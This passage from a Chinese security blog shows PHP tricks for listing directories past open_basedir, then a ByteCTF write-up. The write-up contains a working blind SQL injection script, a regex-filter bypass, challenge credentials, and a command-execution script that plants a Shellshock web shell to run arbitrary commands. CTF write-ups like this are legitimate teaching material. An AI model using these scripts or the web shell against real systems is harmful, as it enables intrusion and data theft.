class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-*/+_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span>.<span class="variable">$chars</span>[<span class="variable">$i</span>].<span class="string">&#x27;&lt;&lt;&#x27;</span>;</span><br><span class="line">    realpath(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexist</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$regex</span> = <span class="string">&#x27;/File\((.*)\) is not within/&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;errstr: %s &lt;br/&gt;&quot;</span>,<span class="variable">$errstr</span>);</span><br><span class="line">    preg_match(<span class="variable">$regex</span>, <span class="variable">$errstr</span>, <span class="variable">$mathes</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$mathes</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        printf(<span class="string">&quot;%s &lt;br/&gt;&lt;br/&gt;&quot;</span>, <span class="variable">$mathes</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SplFileInfo-getRealPath列目录"><a href="#SplFileInfo-getRealPath列目录" class="headerlink" title="SplFileInfo::getRealPath列目录"></a>SplFileInfo::getRealPath列目录</h2><p> SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的<code>realpath</code>很相似，就是<code>getRealPath</code>，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了<code>open_basedir</code>的设定 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s &lt;br/&gt;&lt;br/&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$basedir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&lt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$re</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="GD库imageftbbox-imagefttext列举目录"><a href="#GD库imageftbbox-imagefttext列举目录" class="headerlink" title="GD库imageftbbox/imagefttext列举目录"></a>GD库imageftbbox/imagefttext列举目录</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line">set_error_handler(<span class="string">&#x27;isexists&#x27;</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;d:/test/&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$dir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&gt;&lt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//$m = imagecreatefrompng(&quot;zip.png&quot;);</span></span><br><span class="line">    <span class="comment">//imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, &#x27;aaa&#x27;);</span></span><br><span class="line">    imageftbbox(<span class="number">100</span>, <span class="number">100</span>, <span class="variable">$file</span>, <span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">if</span> (stripos(<span class="variable">$errstr</span>, <span class="string">&#x27;Invalid font filename&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        printf(<span class="string">&quot;%s&lt;br/&gt;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="bindtextdomain暴力猜解目录"><a href="#bindtextdomain暴力猜解目录" class="headerlink" title="bindtextdomain暴力猜解目录"></a>bindtextdomain暴力猜解目录</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png" alt="image19658"></p>
<p> 如上图，这个函数第二个参数<code>$directory</code>是一个文件路径。它会在<code>$directory</code>存在的时候返回<code>$directory</code>，不存在则返回false。 </p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain">https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/bypass_disable_function_open_basedir/" data-id="cku8j3fh3003edan72k3bgpw3" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/bytectfwp/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/bytectfwp/">bytectf wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>])&#123;</span><br><span class="line">		<span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">		<span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">		<span class="variable">$sql</span>-&gt;query(<span class="string">&quot;update article set title=&#x27;<span class="subst">$title</span>&#x27;,content=&#x27;<span class="subst">$content</span>&#x27; where title=&#x27;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&#x27;;&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
<p>sql盲注判断脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">anti_disturb_key=<span class="string">&#x27;cjb_ccreater_s_test&#x27;</span></span><br><span class="line">PHPSESSID=<span class="string">&#x27;404i3uiletdpke9rb0egs7vf47&#x27;</span></span><br><span class="line">check_article_id=<span class="number">20</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">check_title</span>):</span></span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/edit.php?id=&#x27;</span>+<span class="built_in">str</span>(check_article_id)</span><br><span class="line">    res=requests.get(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    bs=BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    title=bs.find(<span class="string">&#x27;input&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;title&quot;</span>&#125;)[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    content=bs.find(<span class="string">&#x27;textarea&#x27;</span>,attrs=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;content&quot;</span>&#125;).text</span><br><span class="line">    <span class="keyword">if</span> title[:<span class="built_in">len</span>(anti_disturb_key)]!=anti_disturb_key :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disturb&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> content!=<span class="string">&#x27;success&#x27;</span>+check_title:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;false&#x27;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_write</span>(<span class="params">title,info</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>:info</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/writing.php&#x27;</span></span><br><span class="line">    res=requests.post(url,data=data,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_newest_id</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;http://112.125.24.134:9999/index.php&#x27;</span></span><br><span class="line">    res=requests.get(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;)</span><br><span class="line">    bs=BeautifulSoup(res.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    newest_id=bs.find(<span class="string">&#x27;article&#x27;</span>).find(<span class="string">&#x27;footer&#x27;</span>).find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    newest_id=newest_id[newest_id.index(<span class="string">&#x27;=&#x27;</span>)+<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(newest_id)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_inject</span>(<span class="params">sql</span>):</span></span><br><span class="line">    title=anti_disturb_key+<span class="string">&quot;&#x27; or (id=&quot;</span>+<span class="built_in">str</span>(check_article_id)+<span class="string">&quot; and (&quot;</span>+sql+<span class="string">&#x27;))#&#x27;</span></span><br><span class="line">    info=<span class="string">&#x27;success&#x27;</span>+title</span><br><span class="line">    <span class="keyword">if</span> make_write(title,info):</span><br><span class="line">        <span class="comment">#编辑id=newest_id的文章来读取$raw[&#x27;title&#x27;]</span></span><br><span class="line">        newest_id=get_newest_id()</span><br><span class="line">        url=<span class="string">&#x27;http://112.125.24.134:9999/edit.php&#x27;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span>:title,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>:info,</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:newest_id</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:PHPSESSID&#125;,data=data)</span><br><span class="line">        <span class="comment">#判断盲注结果</span></span><br><span class="line">        result=check(title)</span><br><span class="line">        <span class="keyword">if</span> result==<span class="string">&#x27;success&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> result==<span class="string">&#x27;disturb&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;受到干扰,重新执行&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> sql_inject(sql)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;程序执行错误,请保持结果&#x27;</span>)</span><br><span class="line">        <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;执行命令:&#x27;</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#demo </span></span><br><span class="line"><span class="comment">#sql=&#x27;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#x27;</span></span><br><span class="line">sql=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(select&#x27;&#x27;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#x27;information_schema&#x27;)=guess </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67</span></span><br><span class="line"><span class="comment">#猜information_schema表名</span></span><br><span class="line"><span class="comment">#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line">result=<span class="string">&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;</span></span><br><span class="line"></span><br><span class="line">index=<span class="built_in">len</span>(result)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    index+=<span class="number">1</span></span><br><span class="line">    temp=sql.replace(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜测第&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;位为:&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> sql_inject(temp.replace(<span class="string">&#x27;guess&#x27;</span>,<span class="built_in">str</span>(i))):</span><br><span class="line">            result+=<span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(result),<span class="number">2</span>):</span><br><span class="line">        res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(result[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>filter=<code>(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess </code>绕过正则过滤</p>
<p>拿到vip账号:wulax,密码:1,网址:<a target="_blank" rel="noopener" href="http://112.126.101.16:9999/">http://112.126.101.16:9999</a></p>
<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
<p>命令执行利用脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://112.126.101.16:9999&quot;</span></span><br><span class="line">arc_id=<span class="string">&quot;11&quot;</span></span><br><span class="line">session=<span class="string">&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="string"># Google Dork: none </span></span><br><span class="line"><span class="string"># Date: 10/31/2014 </span></span><br><span class="line"><span class="string"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="string"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="string"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="string"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="string"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="string"># CVE: CVE-2014-6271 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function shellshock($cmd) &#123; // Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line"><span class="string">   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); </span></span><br><span class="line"><span class="string">   $headers =  &#x27;MIME-Version: 1.0&#x27; . &quot;\r\n&quot;; </span></span><br><span class="line"><span class="string">	$headers .= &#x27;From: Your name &lt;info@address.com&gt;&#x27; . &quot;\r\n&quot;;</span></span><br><span class="line"><span class="string">	$headers .= &#x27;Content-type: text/html; charset=iso-8859-1&#x27; . &quot;\r\n&quot;; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   putenv(&quot;PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1&quot;); </span></span><br><span class="line"><span class="string">   // In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line"><span class="string">   // begin with the prefixes supplied by this directive. </span></span><br><span class="line"><span class="string">   // By default, users will only be able to set environment variablesthat </span></span><br><span class="line"><span class="string">   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line"><span class="string">   // PHP will let the user modify ANY environment variable! </span></span><br><span class="line"><span class="string">   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line"><span class="string">   $output = @file_get_contents($tmp); </span></span><br><span class="line"><span class="string">   @unlink($tmp); </span></span><br><span class="line"><span class="string">   if($output != &quot;&quot;) return $output; </span></span><br><span class="line"><span class="string">   else return &quot;No output, or not vuln.&quot;; </span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">echo shellshock($_REQUEST[&quot;cmd&quot;]); </span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>():</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>:<span class="string">&quot;b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:arc_id</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url+<span class="string">&quot;/edit.php&quot;</span>,data=data,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:session&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span>(<span class="params">s</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;replace&quot;</span>:s,<span class="comment">#&quot;var_dump(scandir(&#x27;/tmp&#x27;));var_dump(file_put_contents(&#x27;/tmp/aaa.php&#x27;,&quot;+&quot;$_POST[&#x27;cmd&#x27;]&quot;+&quot;));&quot;,</span></span><br><span class="line">        <span class="string">&quot;regex&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:arc_id,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>:<span class="string">&quot;b/e\x00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;ls -al&quot;</span>,</span><br><span class="line">        <span class="string">&quot;filepath&quot;</span>:<span class="string">&quot;/tmp/hpdoger.php&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result=requests.post(url+<span class="string">&quot;/replace.php&quot;</span>,data=data,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>:session&#125;)</span><br><span class="line">    edit()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(<span class="built_in">input</span>()).text)</span><br></pre></td></tr></table></figure>

<p>emmmm..到这里就不会做了.到头了.</p>
<p>后来发现有个antsystem()</p>
<p>vardump(antsystem(‘/readfile’));</p>
<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
<p>代码审计发现</p>
<p>在config.php下</p>
